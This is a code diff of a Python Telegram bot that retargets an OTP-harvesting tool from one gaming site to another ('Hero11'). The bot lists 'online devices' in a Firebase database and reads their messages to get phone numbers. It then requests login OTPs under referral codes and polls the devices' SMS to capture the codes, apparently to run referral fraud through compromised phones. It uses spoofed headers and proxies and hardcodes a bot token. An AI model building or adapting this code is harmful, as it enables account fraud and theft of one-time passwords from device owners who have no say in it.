@@ -1,4 +1,4 @@
-import asyncio
+import os
 import re
 import time
 import uuid
@@ -19,7 +19,6 @@ from aiogram.fsm.storage.memory import MemoryStorage
 # ==============================================================================
 BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"  # Apna Telegram Bot Token yahan dalein
 ADMIN_ID = 8337013809  # Apna Admin User ID yahan dalein
-BATCH_SIZE = 10
 OTP_TIMEOUT = 30
 POLL_INTERVAL = 2
 TIMEOUT = 30
@@ -28,7 +27,7 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTM
 dp = Dispatcher(storage=MemoryStorage())
 
 # ==============================================================================
-# 🛒 COMEGAMEHUB ASYNC CLIENT ENGINE
+# 🛒 HERO11 ASYNC CLIENT ENGINE
 # ==============================================================================
 def parse_firebase_link(link: str):
     link = link.strip()
@@ -63,8 +62,8 @@ def get_random_proxy():
         return random.choice(PROXIES_LIST)
     return None
 
-class AsyncComeGameClient:
-    BASE_URL = "https://web-in.comegamehub.com"
+class AsyncHero11Client:
+    BASE_URL = "https://hero11-in.hero11apex.com"
     
     def __init__(self, phone: str, invite_code: str):
         self.phone = re.sub(r'[^0-9+]', '', str(phone))
@@ -95,12 +94,12 @@ class AsyncComeGameClient:
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
             "Content-Type": "application/json",
-            "Origin": "https://web-in.comegamehub.com",
-            "Referer": f"https://web-in.comegamehub.com/en/affiliate-invited?c={self.invite_code}&s=1",
+            "Origin": "https://hero11-in.hero11apex.com",
+            "Referer": f"https://hero11-in.hero11apex.com/en/affiliate-invited?c={self.invite_code}&s=1",
             "X-IP-Country": "IN",
             "X-Region": "IN",
             "X-Lang": "en-US",
-            "X-Site-Code": "web-in",
+            "X-Site-Code": "hero11-in",
             "X-UI-Variant": "v2",
             "Sec-Ch-Ua-Platform": '"Windows"',
             "Sec-Ch-Ua": '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
@@ -228,7 +227,7 @@ class LiveLogger:
 async def cmd_start(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
-    await message.answer("👋 <b>Welcome Admin!</b>\n\nSend your Firebase RTDB link(s) followed by referral codes (one code per line).")
+    await message.answer("👋 <b>Welcome Admin!</b>\n\nSend your Firebase RTDB link followed by referral codes (one code per line).")
 
 @dp.message(F.text)
 async def process_inputs(message: types.Message):
@@ -252,10 +251,10 @@ async def process_inputs(message: types.Message):
 
     status_msg = await message.answer("🔍 <b>Connecting and counting online devices on Firebase...</b>")
     
-    # 1. Fetch Online Devices & Count
     online_targets = []
     total_online_count = 0
     try:
+        import aiohttp
         async with aiohttp.ClientSession() as session:
             async with session.get(f"{firebase_url}clients.json", timeout=10) as r:
                 clients_data = await r.json() or {}
@@ -263,7 +262,6 @@ async def process_inputs(message: types.Message):
             seen_phones = set()
             for cid, cdata in clients_data.items():
                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                    # Fetch client messages to extract active phone number
                     try:
                         async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
                             msgs = await m_req.json()
@@ -309,8 +307,8 @@ async def process_inputs(message: types.Message):
 
         await logger.set_text(f"🎯 Processing Phone: {phone} | Code: {current_code}\n⏳ Requesting OTP...")
 
+        import aiohttp
         async with aiohttp.ClientSession() as session:
-            # Pre-OTP message snapshot
             known_keys = set()
             try:
                 async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
@@ -320,7 +318,7 @@ async def process_inputs(message: types.Message):
             except Exception:
                 pass
 
-        client = AsyncComeGameClient(phone, current_code)
+        client = AsyncHero11Client(phone, current_code)
         send_status = await client.send_otp()
 
         if send_status != "SUCCESS":
@@ -330,7 +328,6 @@ async def process_inputs(message: types.Message):
 
         await logger.set_text(f"🎯 Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (30s timeout)...")
 
-        # Poll for OTP up to 30 seconds
         otp_found = None
         start_poll = time.time()
         while time.time() - start_poll < OTP_TIMEOUT:
